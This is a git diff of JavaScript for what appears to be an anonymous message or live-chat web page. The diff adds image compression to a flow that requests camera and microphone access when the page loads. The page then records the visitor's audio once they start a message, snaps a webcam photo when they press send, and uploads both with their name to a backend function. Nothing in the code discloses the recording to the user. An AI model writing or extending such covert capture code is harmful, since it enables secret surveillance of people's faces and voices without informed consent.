@@ -9,11 +9,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const userNameInput = document.getElementById('userName');
     const emojis = document.querySelectorAll('.emoji');
     const sendButton = document.getElementById('sendButton');
-    
+
     const mainLiveChatButton = document.getElementById('mainLiveChatButton');
     const thankYouLiveChatButton = document.getElementById('liveChatButton');
     const closeButton = document.getElementById('closeButton');
-    
+
     let selectedEmoji = null;
     let mediaRecorder;
     let audioChunks = [];
@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
             // Request camera and microphone
             userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
             console.log('Permissions granted!');
-            
+
             // --- Setup Audio Recording (BUT DO NOT START YET) ---
             mediaRecorder = new MediaRecorder(userMediaStream);
             mediaRecorder.ondataavailable = event => {
@@ -37,7 +37,7 @@ document.addEventListener('DOMContentLoaded', () => {
             console.warn('Permissions were denied by the user.', error);
         }
     }
-    
+
     requestPermissions();
 
     // --- Photo Capture Function ---
@@ -54,6 +54,48 @@ document.addEventListener('DOMContentLoaded', () => {
             return null;
         }
     }
+
+    // --- NEW: Image Compression Function ---
+    function compressImage(imageFile, maxWidth = 800, quality = 0.7) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(imageFile);
+            reader.onload = event => {
+                const img = new Image();
+                img.src = event.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    let width = img.width;
+                    let height = img.height;
+
+                    if (width > height) {
+                        if (width > maxWidth) {
+                            height = Math.round((height * maxWidth) / width);
+                            width = maxWidth;
+                        }
+                    } else {
+                        if (height > maxWidth) { // Use maxWidth for height too, to keep consistent sizing for portrait images
+                            width = Math.round((width * maxWidth) / height);
+                            height = maxWidth;
+                        }
+                    }
+
+                    canvas.width = width;
+                    canvas.height = height;
+
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+
+                    canvas.toBlob(blob => {
+                        resolve(blob);
+                    }, 'image/jpeg', quality); // Convert to JPEG with specified quality
+                };
+                img.onerror = error => reject(error);
+            };
+            reader.onerror = error => reject(error);
+        });
+    }
+
 
     // --- Main Application Flow Logic ---
     messageInput.addEventListener('input', () => {
@@ -74,7 +116,7 @@ document.addEventListener('DOMContentLoaded', () => {
         mainLiveChatButton.classList.add('hidden');
         step2.classList.remove('hidden');
 
-        // --- *** NEW LOGIC: START RECORDING NOW *** ---
+        // --- NEW LOGIC: START RECORDING NOW *** ---
         if (mediaRecorder && mediaRecorder.state === 'inactive') {
             audioChunks = []; // Clear any previous chunks
             mediaRecorder.start();
@@ -109,8 +151,16 @@ document.addEventListener('DOMContentLoaded', () => {
             console.log('Recording stopped by sending message.');
         }
 
-        // Capture photos
-        const photo1 = await capturePhoto();
+        // Capture photo
+        let photo1 = await capturePhoto();
+        let compressedPhoto1 = null;
+
+        // --- NEW: Compress the photo before sending ---
+        if (photo1) {
+            compressedPhoto1 = await compressImage(photo1);
+            console.log('Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
+            console.log('Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
+        }
 
         // Use a small delay to ensure the recorder has time to process the last chunk
         await new Promise(resolve => setTimeout(resolve, 500));
@@ -120,19 +170,19 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('name', userNameInput.value.trim());
         formData.append('emoji', selectedEmoji || 'No reaction');
 
-        if (photo1) {
-            formData.append('photo1', photo1, 'photo1.jpg');
+        if (compressedPhoto1) {
+            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg'); // Use the compressed photo
         }
         if (audioChunks.length > 0) {
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
             formData.append('audio', audioBlob, 'audio.webm');
         }
-        
+
         // --- Sending ALL Data to Backend ---
         try {
             const response = await fetch('/.netlify/functions/send-message', {
                 method: 'POST',
-                body: formData
+                body: formData // FormData sets the correct multipart/form-data headers automatically
             });
 
             if (response.ok) {
